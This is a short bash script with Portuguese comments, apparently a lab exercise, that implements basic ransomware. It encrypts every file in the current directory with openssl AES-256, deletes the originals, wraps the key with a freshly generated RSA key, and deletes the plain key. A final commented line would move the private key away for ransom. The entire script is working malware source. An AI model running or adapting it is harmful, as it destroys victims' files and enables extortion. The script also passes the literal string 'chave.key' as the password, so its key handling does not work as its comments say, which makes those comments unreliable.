#!/bin/bash

# local que quero criptografar neste lab:

arquivos=$(ls)

# variavel que vai armazenar chave privada para decriptar
chave=$(/usr/bin/dbus-uuidgen)

echo $chave > chave.key

# vamos ler todos os arquivos da pasta desejada, exceto arquivos que vou precisar depois:
for file in $arquivos
do
	if [ "$file" != "ranso.sh" ] && [ "$file" != "chave.key" ] && [ "$file" != "resgate.sh" ]
	then
		# agora vamos encriptar tudo usando a chave desejada
		openssl enc -in $file -out $file".enc" -e -aes256 -k chave.key 
		rm $file
	fi
done

# vamos gerar um nova chave para proteger minha chave privada que precisareis depois no resgate
openssl genrsa -out resgate.pem 4096

# extrair a chave publica que vai ser para encriptar a "chave da chave"
openssl rsa -in resgate.pem -outform PEM -pubout -out resgate-pub.pem

# vamos pegar a chave simetrica e encriptar usando a chave publica recém criada
openssl rsautl -in chave.key -out chave.enc -encrypt -pubin -inkey resgate-pub.pem

# remover a chave privada temporaria
rm -rf chave.key
rm -rf resgate-pub.pem

# agora preciso apenas ter em mãos num local seguro remoto a chave privada que decripta a chave de resgate
#mv resgate.pem /home/vergani/
